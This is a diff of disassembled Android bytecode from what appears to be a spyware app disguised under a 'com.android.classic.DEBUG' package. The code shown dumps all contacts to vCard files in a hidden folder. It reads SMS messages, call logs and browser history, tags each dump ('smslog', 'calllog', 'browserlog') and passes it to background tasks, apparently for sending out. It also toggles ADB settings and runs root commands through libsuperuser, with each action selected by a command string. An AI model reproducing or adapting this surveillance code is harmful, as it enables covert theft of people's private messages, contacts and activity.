       [690] pop
-      [691] goto +979 (target=1670)
+      [691] goto +1044 (target=1735)
       [694] aload_0 v0
-      [695] invokevirtual #161
+      [695] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
-      [698] ldc #21
+      [698] ldc #27
         + String [adb_enabled]
       [700] iconst_0
-      [701] invokestatic #155
+      [701] invokestatic #167
         + Methodref [android/provider/Settings$Global.putInt (Landroid/content/ContentResolver;Ljava/lang/String;I)Z]
       [704] pop
-      [705] goto +965 (target=1670)
+      [705] goto +1030 (target=1735)
       [708] astore v7
-      [710] goto +960 (target=1670)
+      [710] goto +1025 (target=1735)
       [713] aload_0 v0
-      [714] getfield #126
+      [714] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [717] getstatic #127
+      [717] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [720] bipush 12
       [722] aaload
-      [723] invokevirtual #191
+      [723] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [726] ifeq +293 (target=1019)
-      [729] new #110
+      [729] new #122
         + Class [java/lang/StringBuilder]
       [732] dup
-      [733] getstatic #117
+      [733] getstatic #129
         + Fieldref [android/os/Build.MODEL Ljava/lang/String;]
-      [736] invokestatic #195
+      [736] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [739] invokespecial #197
+      [739] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [742] ldc #17
+      [742] ldc #23
         + String [_Contacts_]
-      [744] invokevirtual #199
+      [744] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [747] aload v4
-      [749] invokevirtual #199
+      [749] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [752] ldc #9
+      [752] ldc #15
         + String [.vcf]
-      [754] invokevirtual #199
+      [754] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [757] invokevirtual #200
+      [757] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [760] astore v5
-      [762] new #104
+      [762] new #116
         + Class [java/io/File]
       [765] dup
-      [766] new #110
+      [766] new #122
         + Class [java/lang/StringBuilder]
       [769] dup
-      [770] invokestatic #150
+      [770] invokestatic #162
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [773] invokevirtual #182
+      [773] invokevirtual #195
         + Methodref [java/io/File.getPath ()Ljava/lang/String;]
-      [776] invokestatic #195
+      [776] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [779] invokespecial #197
+      [779] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [782] ldc #12
+      [782] ldc #18
         + String [/Android/data/settings/Contacts/]
-      [784] invokevirtual #199
+      [784] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [787] invokevirtual #200
+      [787] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [790] invokespecial #179
+      [790] invokespecial #192
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [793] astore v6
       [795] aload v6
-      [797] invokevirtual #183
+      [797] invokevirtual #196
         + Methodref [java/io/File.mkdirs ()Z]
       [800] pop
-      [801] new #110
+      [801] new #122
         + Class [java/lang/StringBuilder]
       [804] dup
       [805] aload v6
-      [807] invokevirtual #181
+      [807] invokevirtual #194
         + Methodref [java/io/File.getAbsolutePath ()Ljava/lang/String;]
-      [810] invokestatic #195
+      [810] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [813] invokespecial #197
+      [813] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [816] ldc #10
+      [816] ldc #16
         + String [/]
-      [818] invokevirtual #199
+      [818] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [821] aload v5
-      [823] invokevirtual #199
+      [823] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [826] invokevirtual #200
+      [826] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [829] astore v7
       [831] aload_0 v0
-      [832] invokevirtual #161
+      [832] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
-      [835] getstatic #122
+      [835] getstatic #134
         + Fieldref [android/provider/ContactsContract$CommonDataKinds$Phone.CONTENT_URI Landroid/net/Uri;]
       [838] aconst_null
       [839] aconst_null
       [840] aconst_null
       [841] aconst_null
-      [842] invokevirtual #137
+      [842] invokevirtual #149
         + Methodref [android/content/ContentResolver.query (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;]
       [845] astore v8
       [847] aload v8
-      [849] invokeinterface #211
+      [849] invokeinterface #224
         + InterfaceMethodref [android/database/Cursor.moveToFirst ()Z]
       [854] pop
       [855] iconst_0
@@ -37134,222 +37156,222 @@ Methods (count = 6):
       [858] goto +126 (target=984)
       [861] aload v8
       [863] aload v8
-      [865] ldc #42
+      [865] ldc #49
         + String [lookup]
-      [867] invokeinterface #206
+      [867] invokeinterface #219
         + InterfaceMethodref [android/database/Cursor.getColumnIndex (Ljava/lang/String;)I]
-      [872] invokeinterface #209
+      [872] invokeinterface #222
         + InterfaceMethodref [android/database/Cursor.getString (I)Ljava/lang/String;]
       [877] astore v10
-      [879] getstatic #123
+      [879] getstatic #135
         + Fieldref [android/provider/ContactsContract$Contacts.CONTENT_VCARD_URI Landroid/net/Uri;]
       [882] aload v10
-      [884] invokestatic #148
+      [884] invokestatic #160
         + Methodref [android/net/Uri.withAppendedPath (Landroid/net/Uri;Ljava/lang/String;)Landroid/net/Uri;]
       [887] astore v11
       [889] aload_0 v0
-      [890] invokevirtual #161
+      [890] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
       [893] aload v11
-      [895] ldc #53
+      [895] ldc #61
         + String [r]
-      [897] invokevirtual #136
+      [897] invokevirtual #148
         + Methodref [android/content/ContentResolver.openAssetFileDescriptor (Landroid/net/Uri;Ljava/lang/String;)Landroid/content/res/AssetFileDescriptor;]
       [900] astore v12
       [902] aload v12
-      [904] invokevirtual #144
+      [904] invokevirtual #156
         + Methodref [android/content/res/AssetFileDescriptor.createInputStream ()Ljava/io/FileInputStream;]
       [907] astore v13
       [909] aload v12
-      [911] invokevirtual #145
+      [911] invokevirtual #157
         + Methodref [android/content/res/AssetFileDescriptor.getDeclaredLength ()J]
       [914] l2i
       [915] newarray 8
       [917] astore v14
       [919] aload v13
       [921] aload v14
-      [923] invokevirtual #184
+      [923] invokevirtual #197
         + Methodref [java/io/FileInputStream.read ([B)I]
       [926] pop
-      [927] new #109
+      [927] new #121
         + Class [java/lang/String]
       [930] dup
       [931] aload v14
-      [933] invokespecial #189
+      [933] invokespecial #202
         + Methodref [java/lang/String.<init> ([B)V]
       [936] astore v15
-      [938] new #106
+      [938] new #118
         + Class [java/io/FileOutputStream]
       [941] dup
       [942] aload v7
       [944] iconst_1
-      [945] invokespecial #185
+      [945] invokespecial #198
         + Methodref [java/io/FileOutputStream.<init> (Ljava/lang/String;Z)V]
       [948] astore v16
       [950] aload v16
       [952] aload v15
-      [954] invokevirtual #194
+      [954] invokevirtual #207
         + Methodref [java/lang/String.toString ()Ljava/lang/String;]
-      [957] invokevirtual #192
+      [957] invokevirtual #205
         + Methodref [java/lang/String.getBytes ()[B]
-      [960] invokevirtual #186
+      [960] invokevirtual #199
         + Methodref [java/io/FileOutputStream.write ([B)V]
       [963] aload v8
-      [965] invokeinterface #212
+      [965] invokeinterface #225
         + InterfaceMethodref [android/database/Cursor.moveToNext ()Z]
       [970] pop
       [971] goto +10 (target=981)
       [974] astore v13
       [976] aload v13
-      [978] invokevirtual #187
+      [978] invokevirtual #200
         + Methodref [java/lang/Exception.printStackTrace ()V]
       [981] iinc v9, 1
       [984] iload v9
       [986] aload v8
-      [988] invokeinterface #207
+      [988] invokeinterface #220
         + InterfaceMethodref [android/database/Cursor.getCount ()I]
       [993] ificmplt -132 (target=861)
-      [996] new #98
-        + Class [com/android/classic/helper/h]
+      [996] new #110
+        + Class [com/android/classic/helper/i]
       [999] dup
-      [1000] invokespecial #173
-        + Methodref [com/android/classic/helper/h.<init> ()V]
+      [1000] invokespecial #186
+        + Methodref [com/android/classic/helper/i.<init> ()V]
       [1003] iconst_1
-      [1004] anewarray #109
+      [1004] anewarray #121
         + Class [java/lang/String]
       [1007] dup
       [1008] iconst_0
       [1009] aload v7
       [1011] aastore
-      [1012] invokevirtual #174
-        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [1012] invokevirtual #187
+        + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [1015] pop
-      [1016] goto +654 (target=1670)
+      [1016] goto +719 (target=1735)
       [1019] aload_0 v0
-      [1020] getfield #126
+      [1020] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [1023] getstatic #127
+      [1023] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [1026] bipush 13
       [1028] aaload
-      [1029] invokevirtual #191
+      [1029] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [1032] ifeq +192 (target=1224)
-      [1035] ldc #34
+      [1035] ldc #41
         + String [content://sms/inbox]
-      [1037] invokestatic #147
+      [1037] invokestatic #159
         + Methodref [android/net/Uri.parse (Ljava/lang/String;)Landroid/net/Uri;]
       [1040] astore v5
       [1042] aload_0 v0
-      [1043] invokevirtual #161
+      [1043] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
       [1046] aload v5
       [1048] bipush 6
-      [1050] anewarray #109
+      [1050] anewarray #121
         + Class [java/lang/String]
       [1053] dup
       [1054] iconst_0
-      [1055] ldc #20
+      [1055] ldc #26
         + String [_id]
       [1057] aastore
       [1058] dup
       [1059] iconst_1
-      [1060] ldc #62
+      [1060] ldc #72
         + String [thread_id]
       [1062] aastore
       [1063] dup
       [1064] iconst_2
-      [1065] ldc #22
+      [1065] ldc #28
         + String [address]
       [1067] aastore
       [1068] dup
       [1069] iconst_3
-      [1070] ldc #51
+      [1070] ldc #59
         + String [person]
       [1072] aastore
       [1073] dup
       [1074] iconst_4
-      [1075] ldc #35
+      [1075] ldc #42
         + String [date]
       [1077] aastore
       [1078] dup
       [1079] iconst_5
-      [1080] ldc #26
+      [1080] ldc #32
         + String [body]
       [1082] aastore
       [1083] aconst_null
       [1084] aconst_null
       [1085] aconst_null
-      [1086] invokevirtual #137
+      [1086] invokevirtual #149
         + Methodref [android/content/ContentResolver.query (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;]
       [1089] astore v6
-      [1091] ldc #4
+      [1091] ldc #9
         + String []
       [1093] astore v7
       [1095] goto +87 (target=1182)
       [1098] aload v6
       [1100] iconst_4
-      [1101] invokeinterface #208
+      [1101] invokeinterface #221
         + InterfaceMethodref [android/database/Cursor.getLong (I)J]
       [1106] lstore v8
       [1108] aload_3 v3
-      [1109] new #113
+      [1109] new #125
         + Class [java/util/Date]
       [1112] dup
       [1113] lload v8
-      [1115] invokespecial #205
+      [1115] invokespecial #218
         + Methodref [java/util/Date.<init> (J)V]
-      [1118] invokevirtual #203
+      [1118] invokevirtual #216
         + Methodref [java/text/SimpleDateFormat.format (Ljava/util/Date;)Ljava/lang/String;]
       [1121] astore v10
-      [1123] new #110
+      [1123] new #122
         + Class [java/lang/StringBuilder]
       [1126] dup
       [1127] aload v7
-      [1129] invokestatic #195
+      [1129] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [1132] invokespecial #197
+      [1132] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [1135] aload v10
-      [1137] invokevirtual #199
+      [1137] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1140] ldc #65
+      [1140] ldc #76
         + String [|]
-      [1142] invokevirtual #199
+      [1142] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [1145] aload v6
       [1147] iconst_2
-      [1148] invokeinterface #209
+      [1148] invokeinterface #222
         + InterfaceMethodref [android/database/Cursor.getString (I)Ljava/lang/String;]
-      [1153] invokevirtual #199
+      [1153] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1156] ldc #65
+      [1156] ldc #76
         + String [|]
-      [1158] invokevirtual #199
+      [1158] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [1161] aload v6
       [1163] iconst_5
-      [1164] invokeinterface #209
+      [1164] invokeinterface #222
         + InterfaceMethodref [android/database/Cursor.getString (I)Ljava/lang/String;]
-      [1169] invokevirtual #199
+      [1169] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1172] ldc #66
+      [1172] ldc #77
         + String [||]
-      [1174] invokevirtual #199
+      [1174] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1177] invokevirtual #200
+      [1177] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [1180] astore v7
       [1182] aload v6
-      [1184] invokeinterface #212
+      [1184] invokeinterface #225
         + InterfaceMethodref [android/database/Cursor.moveToNext ()Z]
       [1189] ifne -91 (target=1098)
       [1192] iconst_2
-      [1193] anewarray #109
+      [1193] anewarray #121
         + Class [java/lang/String]
       [1196] dup
       [1197] iconst_0
-      [1198] ldc #61
+      [1198] ldc #70
         + String [smslog]
       [1200] aastore
       [1201] dup
@@ -37357,140 +37379,140 @@ Methods (count = 6):
       [1203] aload v7
       [1205] aastore
       [1206] astore v8
-      [1208] new #97
-        + Class [com/android/classic/helper/g]
+      [1208] new #109
+        + Class [com/android/classic/helper/h]
       [1211] dup
-      [1212] invokespecial #171
-        + Methodref [com/android/classic/helper/g.<init> ()V]
+      [1212] invokespecial #184
+        + Methodref [com/android/classic/helper/h.<init> ()V]
       [1215] aload v8
-      [1217] invokevirtual #172
-        + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [1217] invokevirtual #185
+        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [1220] pop
-      [1221] goto +449 (target=1670)
+      [1221] goto +514 (target=1735)
       [1224] aload_0 v0
-      [1225] getfield #126
+      [1225] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [1228] getstatic #127
+      [1228] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [1231] bipush 14
       [1233] aaload
-      [1234] invokevirtual #191
+      [1234] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [1237] ifeq +200 (target=1437)
-      [1240] ldc #4
+      [1240] ldc #9
         + String []
       [1242] astore v5
       [1244] iconst_5
-      [1245] anewarray #109
+      [1245] anewarray #121
         + Class [java/lang/String]
       [1248] dup
       [1249] iconst_0
-      [1250] ldc #47
+      [1250] ldc #55
         + String [number]
       [1252] aastore
       [1253] dup
       [1254] iconst_1
-      [1255] ldc #63
+      [1255] ldc #73
         + String [type]
       [1257] aastore
       [1258] dup
       [1259] iconst_2
-      [1260] ldc #46
+      [1260] ldc #54
         + String [name]
       [1262] aastore
       [1263] dup
       [1264] iconst_3
-      [1265] ldc #48
+      [1265] ldc #56
         + String [numbertype]
       [1267] aastore
       [1268] dup
       [1269] iconst_4
-      [1270] ldc #35
+      [1270] ldc #42
         + String [date]
       [1272] aastore
       [1273] astore v6
-      [1275] ldc #36
+      [1275] ldc #43
         + String [date DESC]
       [1277] astore v7
       [1279] aload_0 v0
-      [1280] invokevirtual #161
+      [1280] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
-      [1283] getstatic #121
+      [1283] getstatic #133
         + Fieldref [android/provider/CallLog$Calls.CONTENT_URI Landroid/net/Uri;]
       [1286] aload v6
       [1288] aconst_null
       [1289] aconst_null
       [1290] aload v7
-      [1292] invokevirtual #137
+      [1292] invokevirtual #149
         + Methodref [android/content/ContentResolver.query (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;]
       [1295] astore v8
       [1297] aload v8
-      [1299] invokeinterface #211
+      [1299] invokeinterface #224
         + InterfaceMethodref [android/database/Cursor.moveToFirst ()Z]
       [1304] ifeq +101 (target=1405)
       [1307] aload v8
-      [1309] ldc #35
+      [1309] ldc #42
         + String [date]
-      [1311] invokeinterface #206
+      [1311] invokeinterface #219
         + InterfaceMethodref [android/database/Cursor.getColumnIndex (Ljava/lang/String;)I]
       [1316] istore v9
       [1318] aload v8
       [1320] iload v9
-      [1322] invokeinterface #208
+      [1322] invokeinterface #221
         + InterfaceMethodref [android/database/Cursor.getLong (I)J]
       [1327] lstore v10
       [1329] aload_3 v3
-      [1330] new #113
+      [1330] new #125
         + Class [java/util/Date]
       [1333] dup
       [1334] lload v10
-      [1336] invokespecial #205
+      [1336] invokespecial #218
         + Methodref [java/util/Date.<init> (J)V]
-      [1339] invokevirtual #203
+      [1339] invokevirtual #216
         + Methodref [java/text/SimpleDateFormat.format (Ljava/util/Date;)Ljava/lang/String;]
       [1342] astore v12
-      [1344] new #110
+      [1344] new #122
         + Class [java/lang/StringBuilder]
       [1347] dup
       [1348] aload v5
-      [1350] invokestatic #195
+      [1350] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [1353] invokespecial #197
+      [1353] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [1356] aload v12
-      [1358] invokevirtual #199
+      [1358] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1361] ldc #65
+      [1361] ldc #76
         + String [|]
-      [1363] invokevirtual #199
+      [1363] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [1366] aload v8
       [1368] aload v8
-      [1370] ldc #47
+      [1370] ldc #55
         + String [number]
-      [1372] invokeinterface #206
+      [1372] invokeinterface #219
         + InterfaceMethodref [android/database/Cursor.getColumnIndex (Ljava/lang/String;)I]
-      [1377] invokeinterface #209
+      [1377] invokeinterface #222
         + InterfaceMethodref [android/database/Cursor.getString (I)Ljava/lang/String;]
-      [1382] invokevirtual #199
+      [1382] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1385] ldc #66
+      [1385] ldc #77
         + String [||]
-      [1387] invokevirtual #199
+      [1387] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1390] invokevirtual #200
+      [1390] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [1393] astore v5
       [1395] aload v8
-      [1397] invokeinterface #212
+      [1397] invokeinterface #225
         + InterfaceMethodref [android/database/Cursor.moveToNext ()Z]
       [1402] ifne -95 (target=1307)
       [1405] iconst_2
-      [1406] anewarray #109
+      [1406] anewarray #121
         + Class [java/lang/String]
       [1409] dup
       [1410] iconst_0
-      [1411] ldc #28
+      [1411] ldc #35
         + String [calllog]
       [1413] aastore
       [1414] dup
@@ -37498,111 +37520,111 @@ Methods (count = 6):
       [1416] aload v5
       [1418] aastore
       [1419] astore v9
-      [1421] new #97
-        + Class [com/android/classic/helper/g]
+      [1421] new #109
+        + Class [com/android/classic/helper/h]
       [1424] dup
-      [1425] invokespecial #171
-        + Methodref [com/android/classic/helper/g.<init> ()V]
+      [1425] invokespecial #184
+        + Methodref [com/android/classic/helper/h.<init> ()V]
       [1428] aload v9
-      [1430] invokevirtual #172
-        + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [1430] invokevirtual #185
+        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [1433] pop
-      [1434] goto +236 (target=1670)
+      [1434] goto +301 (target=1735)
       [1437] aload_0 v0
-      [1438] getfield #126
+      [1438] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [1441] getstatic #127
+      [1441] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [1444] bipush 15
       [1446] aaload
-      [1447] invokevirtual #191
+      [1447] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [1450] ifeq +172 (target=1622)
-      [1453] ldc #4
+      [1453] ldc #9
         + String []
       [1455] astore v5
       [1457] aload_0 v0
-      [1458] invokevirtual #161
+      [1458] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
-      [1461] getstatic #119
+      [1461] getstatic #131
         + Fieldref [android/provider/Browser.BOOKMARKS_URI Landroid/net/Uri;]
-      [1464] getstatic #120
+      [1464] getstatic #132
         + Fieldref [android/provider/Browser.HISTORY_PROJECTION [Ljava/lang/String;]
       [1467] aconst_null
       [1468] aconst_null
       [1469] aconst_null
-      [1470] invokevirtual #137
+      [1470] invokevirtual #149
         + Methodref [android/content/ContentResolver.query (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;]
       [1473] astore v6
       [1475] aload v6
-      [1477] invokeinterface #211
+      [1477] invokeinterface #224
         + InterfaceMethodref [android/database/Cursor.moveToFirst ()Z]
       [1482] pop
       [1483] aload v6
-      [1485] invokeinterface #211
+      [1485] invokeinterface #224
         + InterfaceMethodref [android/database/Cursor.moveToFirst ()Z]
       [1490] ifeq +100 (target=1590)
       [1493] aload v6
-      [1495] invokeinterface #207
+      [1495] invokeinterface #220
         + InterfaceMethodref [android/database/Cursor.getCount ()I]
       [1500] ifle +90 (target=1590)
       [1503] goto +77 (target=1580)
-      [1506] new #110
+      [1506] new #122
         + Class [java/lang/StringBuilder]
       [1509] dup
       [1510] aload v5
-      [1512] invokestatic #195
+      [1512] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [1515] invokespecial #197
+      [1515] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [1518] aload v6
       [1520] iconst_5
-      [1521] invokeinterface #209
+      [1521] invokeinterface #222
         + InterfaceMethodref [android/database/Cursor.getString (I)Ljava/lang/String;]
-      [1526] invokevirtual #199
+      [1526] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1529] invokevirtual #200
+      [1529] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [1532] astore v5
-      [1534] new #110
+      [1534] new #122
         + Class [java/lang/StringBuilder]
       [1537] dup
       [1538] aload v5
-      [1540] invokestatic #195
+      [1540] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [1543] invokespecial #197
+      [1543] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [1546] ldc #65
+      [1546] ldc #76
         + String [|]
-      [1548] invokevirtual #199
+      [1548] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [1551] aload v6
       [1553] iconst_1
-      [1554] invokeinterface #209
+      [1554] invokeinterface #222
         + InterfaceMethodref [android/database/Cursor.getString (I)Ljava/lang/String;]
-      [1559] invokevirtual #199
+      [1559] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1562] ldc #66
+      [1562] ldc #77
         + String [||]
-      [1564] invokevirtual #199
+      [1564] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1567] invokevirtual #200
+      [1567] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [1570] astore v5
       [1572] aload v6
-      [1574] invokeinterface #212
+      [1574] invokeinterface #225
         + InterfaceMethodref [android/database/Cursor.moveToNext ()Z]
       [1579] pop
       [1580] aload v6
-      [1582] invokeinterface #210
+      [1582] invokeinterface #223
         + InterfaceMethodref [android/database/Cursor.isAfterLast ()Z]
       [1587] ifeq -81 (target=1506)
       [1590] iconst_2
-      [1591] anewarray #109
+      [1591] anewarray #121
         + Class [java/lang/String]
       [1594] dup
       [1595] iconst_0
-      [1596] ldc #27
+      [1596] ldc #33
         + String [browserlog]
       [1598] aastore
       [1599] dup
@@ -37610,78 +37632,129 @@ Methods (count = 6):
       [1601] aload v5
       [1603] aastore
       [1604] astore v7
-      [1606] new #97
-        + Class [com/android/classic/helper/g]
+      [1606] new #109
+        + Class [com/android/classic/helper/h]
       [1609] dup
-      [1610] invokespecial #171
-        + Methodref [com/android/classic/helper/g.<init> ()V]
+      [1610] invokespecial #184
+        + Methodref [com/android/classic/helper/h.<init> ()V]
       [1613] aload v7
-      [1615] invokevirtual #172
-        + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [1615] invokevirtual #185
+        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [1618] pop
-      [1619] goto +51 (target=1670)
+      [1619] goto +116 (target=1735)
       [1622] aload_0 v0
-      [1623] getfield #126
+      [1623] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [1626] getstatic #127
+      [1626] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [1629] bipush 16
       [1631] aaload
-      [1632] invokevirtual #191
+      [1632] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [1635] ifeq +13 (target=1648)
-      [1638] new #96
+      [1638] new #107
         + Class [com/android/classic/helper/f]
       [1641] aload_0 v0
-      [1642] invokespecial #170
+      [1642] invokespecial #182
         + Methodref [com/android/classic/helper/f.<init> (Landroid/content/Context;)V]
-      [1645] goto +25 (target=1670)
+      [1645] goto +90 (target=1735)
       [1648] aload_0 v0
-      [1649] getfield #126
+      [1649] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [1652] getstatic #127
+      [1652] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [1655] bipush 17
       [1657] aaload
-      [1658] invokevirtual #191
+      [1658] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
-      [1661] ifeq +9 (target=1670)
-      [1664] ldc #41
+      [1661] ifeq +12 (target=1673)
+      [1664] ldc #48
         + String [id]
-      [1666] invokestatic #177
-        + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
-      [1669] pop
-      [1670] ldc2_w #115
-        + Long [5000]
-      [1673] invokestatic #201
-        + Methodref [java/lang/Thread.sleep (J)V]
-      [1676] aload_0 v0
-      [1677] invokevirtual #160
-        + Methodref [com/android/classic/DEBUG.finish ()V]
-      [1680] goto +34 (target=1714)
-      [1683] astore v5
-      [1685] new #110
-        + Class [java/lang/StringBuilder]
-      [1688] dup
-      [1689] ldc #40
-        + String [echo 'CODELIST | ]
-      [1691] invokespecial #197
-        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [1694] aload v5
-      [1696] invokevirtual #188
-        + Methodref [java/lang/Exception.toString ()Ljava/lang/String;]
-      [1699] invokevirtual #199
-        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1702] ldc #6
-        + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
-      [1704] invokevirtual #199
-        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [1707] invokevirtual #200
-        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [1710] invokestatic #175
+      [1666] invokestatic #190
         + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-      [1713] pop
-      [1714] return
+      [1669] pop
+      [1670] goto +65 (target=1735)
+      [1673] aload_0 v0
+      [1674] getfield #138
+        + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
+      [1677] getstatic #139
